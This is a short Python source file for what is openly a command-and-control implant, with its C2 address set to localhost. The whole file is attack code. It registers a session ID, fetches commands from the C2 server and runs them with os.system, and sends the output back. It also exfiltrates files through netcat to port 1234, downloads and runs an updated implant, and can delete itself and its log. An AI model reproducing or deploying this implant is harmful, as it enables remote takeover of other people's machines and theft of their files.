import urllib.request
import urllib
import os
import time
import subprocess
import sys

#Comms
c2 = 'http://localhost:443'
c2IPAdress = 'localhost'

#This will upload a file to the target server.
def ExfilFile(file, c2, IPAddress):
    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
    os.system(f'nc {IPAddress} 1234 < {file}')
    return

#This will download the new version of the implant, and then run it as a subprocess.
def updateImplant():
    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', "implant.py")
    subprocess.Popen([sys.executable, "implant.py"])
    return

#This will self destruct our implant.
def selfDestruct():
    os.system('rm sid.log; rm implant.py')
    destructMsg = urllib.parse.quote_plus("Implant has self destructed")
    urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
    return

#initialiazation, this will set establish a Session ID
if(os.path.isfile("sid.log")):
    sid = open("sid.log", "r").read()
    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}')
else:
    sid = urllib.request.urlopen(f'{c2}/').read().decode("utf-8")
    f = open("sid.log", "w")
    f.write(sid)
    f.close()

# Command execution
time.sleep(2)
response = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}')
command = response.read().decode("utf-8")
os.system(command) #runs the command from our C2 server on the target
commanddata = os.popen(command)
commanddatatext = urllib.parse.quote_plus(commanddata.read())

#Send command output to C2
urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
